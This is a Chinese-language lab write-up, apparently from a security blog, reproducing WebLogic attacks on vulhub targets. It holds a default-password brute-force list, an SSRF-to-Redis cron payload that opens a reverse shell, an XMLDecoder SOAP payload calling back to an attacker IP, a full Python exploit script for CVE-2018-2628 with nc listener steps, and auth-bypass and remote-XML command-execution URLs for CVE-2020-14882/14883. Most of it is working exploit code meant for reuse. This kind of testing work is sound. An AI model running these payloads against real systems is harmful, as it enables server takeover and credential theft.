# 控制台路径泄露&弱口令

WebLogic控制台的默认路径为`console/login/LoginForm.jsp`

利用弱口令进入控制台,此处没有验证码机制可以进行爆破,常见爆破字典如下

```
system/password
weblogic/weblogic
weblogic/weblogic123
weblogic/weblogic2
admin/security
joe/password
mary/password
system/security
wlcsystem/wlcsystem
wlpisystem/wlpisystem
guest/guest
portaladmin/portaladmin
system/system
WebLogic/WebLogic
```

使用`vulhub`的WebLogic靶场进行复现,其弱口令为`weblogic/Oracle@123`

![](https://img.mi3aka.eu.org/2022/09/04e3546665f448052bb4fbdc4fb85581.png)

利用`域结构-部署-上传文件`部署war包进行getshell

![](https://img.mi3aka.eu.org/2022/09/692f5884d18ebda70dc927ad7c3a9b2c.png)

![](https://img.mi3aka.eu.org/2022/09/db0136659c00c6f3dec2beb21cdb8a0f.png)

# 利用任意文件读取漏洞获取后台用户密文和密钥

>weblogic密码使用AES(老版本3DES)加密,对称加密可解密,只需要找到用户的密文与加密时的密钥即可,这两个文件均位于base_domain下,名为`SerializedSystemIni.dat`和`config.xml`,在本环境中为`./security/SerializedSystemIni.dat`和`./config/config.xml`(基于当前目录`/root/Oracle/Middleware/user_projects/domains/base_domain`)

![](https://img.mi3aka.eu.org/2022/09/26f5cfeba8e67a3fde4d7ebca104e5d8.png)

![](https://img.mi3aka.eu.org/2022/09/3049727c94ac9490e7437f139cc1c4c2.png)

>直接用`wget`下载下来的文件会多了两个`0d0a`

![](https://img.mi3aka.eu.org/2022/09/a7386028c5cf079c3b30beeec69d0b3f.png)

去除换行符号后成功解密

![](https://img.mi3aka.eu.org/2022/09/e1b963bcc4c7c7f96e1f612dbe4e1c25.png)

# SSRF

![](https://img.mi3aka.eu.org/2022/09/772dd8663eafd6ee8c5804ccf414ad3f.png)

通过错误回显的不同进行内网探测

内网存在该端口时,回显`Received a response from url: http://172.17.0.1:8000/ which did not have a valid SOAP content-type`

不存在该端口时,回显`Tried all: addresses, but could not connect over HTTP to server`

## WebLogic-SSRF-Redis

>vulhub的镜像好像不能正常启动

通过传入`%0a%0d`来注入换行符,而redis是通过换行符来分隔每条命令,也就说我们可以通过该SSRF攻击内网中的redis服务器

发送三条redis命令,将弹shell脚本写入`/etc/crontab`:

```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/evil/21 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

进行url编码:

```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```

可进行利用的cron有如下几个地方:

- /etc/crontab 这个是肯定的
- /etc/cron.d/* 将任意文件写到该目录下,效果和crontab相同,格式也要和/etc/crontab相同,漏洞利用这个目录,可以做到不覆盖任何其他文件的情况进行弹shell
- /var/spool/cron/root centos系统下root用户的cron文件
- /var/spool/cron/crontabs/root debian系统下root用户的cron文件

# CVE-2017-10271

>Weblogic的WLS Security组件对外提供webservice服务,其中使用了XMLDecoder来解析用户传入的XML数据,在解析的过程中出现反序列化漏洞,导致可执行任意命令

![](https://img.mi3aka.eu.org/2022/09/d143ad09812a1a809ebc002b15e104ed.png)

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.89.129/8000 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

`>&`使用url编码无法反弹,要更改成`&gt;&amp;`才能够正常反弹

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%@page import="java...uals(pageContext);}%>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

![](https://img.mi3aka.eu.org/2022/09/7459bf98e7c5ae58a62e2ae2a347ae9b.png)

>分析

[weblogic漏洞分析之CVE-2017-10271](https://xz.aliyun.com/t/10172)

![](https://img.mi3aka.eu.org/2022/09/94001f950baa97931a44fb7c84c2d774.png)

`wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class`

```java
    public NextAction processRequest(Packet var1) {//var1为传入的xml内容
        this.isUseOldFormat = false;
        if (var1.getMessage() != null) {
            HeaderList var2 = var1.getMessage().getHeaders();
            Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true);
            if (var3 != null) {
                this.readHeaderOld(var3);//在readHeaderOld方法中处理读取的xml
                this.isUseOldFormat = true;
            }

            Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true);
            if (var4 != null) {
                this.readHeader(var4);
            }
        }

        return super.processRequest(var1);
    }
```

![](https://img.mi3aka.eu.org/2022/09/dddd0d75f5f40ec8274af6551ad2d44e.png)

```java
    protected void readHeaderOld(Header var1) {
        try {
            XMLStreamReader var2 = var1.readHeader();
            var2.nextTag();
            var2.nextTag();
            XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter();
            ByteArrayOutputStream var4 = new ByteArrayOutputStream();//var4为ByteArrayOutputStream
            XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);
            var3.bridge(var2, var5);//将xml以bytearray的形式写入var4
            var5.close();
            WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));//进行XMLDecoder
            /*public WorkContextXmlInputAdapter(InputStream var1) {
                this.xmlDecoder = new XMLDecoder(var1);
            }*/
            this.receive(var6);
        } catch (XMLStreamException var7) {
            throw new WebServiceException(var7);
        } catch (IOException var8) {
            throw new WebServiceException(var8);
        }
    }
```

![](https://img.mi3aka.eu.org/2022/09/48c277612e9862cf9bbe21388c8b400c.png)

```java
    protected void receive(WorkContextInput var1) throws IOException {
        WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor();
        var2.receiveRequest(var1);
    }

    public void receiveRequest(WorkContextInput var1) throws IOException {
        while(true) {
            try {
                WorkContextEntry var2 = WorkContextEntryImpl.readEntry(var1);
                if (var2 == WorkContextEntry.NULL_CONTEXT) {
                    return;
                }

                String var3 = var2.getName();
                this.map.put(var3, var2);
                if (debugWorkContext.isDebugEnabled()) {
                    debugWorkContext.debug("receiveRequest(" + var2.toString() + ")");
                }
            } catch (ClassNotFoundException var4) {
                if (debugWorkContext.isDebugEnabled()) {
                    debugWorkContext.debug("receiveRequest : ", var4);
                }
            }
        }
    }

    public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException {
        String var1 = var0.readUTF();
        return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));
    }

    public String readUTF() throws IOException {
        return (String)this.xmlDecoder.readObject();//最终在此处进行反序列化
    }
```

WLS组件接收到SOAP格式的请求后,进行xml解析后,没有对参数进行检查,就直接进行`readObject`反序列化

# CVE-2018-2628

>Weblogic WLS Core Components 反序列化命令执行漏洞

[https://www.exploit-db.com/exploits/44553](https://www.exploit-db.com/exploits/44553)

>做了一定的修改,使其能够在Python3.9的环境下运行

```python
# -*- coding: utf-8 -*-
# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
#
# IMPORTANT: Is provided only for educational or information purposes.
#
# Credit: Thanks by Liao Xinxi of NSFOCUS Security Team
# Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA
#
# How to exploit:
# 1. run below command on JRMPListener host
#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -nv 10.0.0.5 4040'
# 2. start a listener on attacker host
#    e.g. nc -nlvp 4040
# 3. run this script on attacker host
#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
#       e.g.
#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)
#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)

from __future__ import print_function

import binascii
import os
import socket
import sys
import time


def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    #generates ysoserial payload
    command = 'java -jar {} {} {}:{} > payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)
    print("command: " + command)
    os.system(command)
    bin_file = open('payload.out','rb').read()
    return binascii.hexlify(bin_file)


def t3_handshake(sock, server_addr):
    sock.connect(server_addr)
    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
    time.sleep(1)
    sock.recv(1024)
    print('handshake successful')


def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(bytes.fromhex(d))
    time.sleep(2)
    print('send request payload successful,recv length:%d'%(len(sock.recv(2048))))


def send_payload_objdata(sock, data):
    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload+=data.decode()
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s'%('{:08x}'.format(int(len(payload)/2) + 4),payload)
    sock.send(bytes.fromhex(payload))
    time.sleep(2)
    sock.send(bytes.fromhex(payload))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception:
        pass
    return res


def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3_handshake(sock, server_addr)
    build_t3_request_object(sock, dport)
    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
    print("payload: " + payload.decode())
    rs=send_payload_objdata(sock, payload)
    print('response: ' + rs)
    print('exploit completed!')


if __name__=="__main__":
    #check for args, print usage if incorrect
    if len(sys.argv) != 7:
        print('\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '
              '[JRMPListener ip] [JRMPListener port] [JRMPClient]\n')
        sys.exit()

    dip = sys.argv[1]
    dport = int(sys.argv[2])
    path_ysoserial = sys.argv[3]
    jrmp_listener_ip = sys.argv[4]
    jrmp_listener_port = sys.argv[5]
    jrmp_client = sys.argv[6]
    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
```

![](https://img.mi3aka.eu.org/2022/09/51ceecf76e63c20aab9b7302c02dd824.png)

# CVE-2018-2894

>Weblogic 任意文件上传漏洞

在开启web服务测试页时存在任意文件上传漏洞

>手动开启web服务测试页

![](https://img.mi3aka.eu.org/2022/09/a853781aa8ca2afe25003b7e072b282e.png)

>在`/ws_utc/config.do`中将当前工作目录设置为`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`,因为css目录没有访问限制,在安全选项卡中上传文件,回显中包含上传时的时间戳

![](https://img.mi3aka.eu.org/2022/09/0e241e220fa1eea77be48671c2eab166.png)

通过访问`/ws_utc/css/config/keystore/[时间戳]_[文件名]`得到上传的文件

![](https://img.mi3aka.eu.org/2022/09/91ce8178f5ea94a30bf1cc6235dcc759.png)

# CVE-2020-14882&CVE-2020-14883

## CVE-2020-14882(权限绕过漏洞)

访问`http://192.168.89.129:7001/console/css/%252e%252e%252fconsole.portal`即可打开管理后台页面

![](https://img.mi3aka.eu.org/2022/09/ea0f18e185fcefaf97282944c7eaa515.png)

## CVE-2020-14883

通过`com.tangosol.coherence.mvel2.sh.ShellSession`或通过`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`执行命令

1. com.tangosol.coherence.mvel2.sh.ShellSession

`http://192.168.89.129:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")`

![](https://img.mi3aka.eu.org/2022/09/4b5cd7baa9c3bd418ec794b15daff345.png)

2. com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext

通过加载外部的恶意xml达到rce的目的

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

`http://192.168.89.129:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.89.129:8000/test.xml")`

![](https://img.mi3aka.eu.org/2022/09/3cae07016e9b28555d90ef64800b478b.png)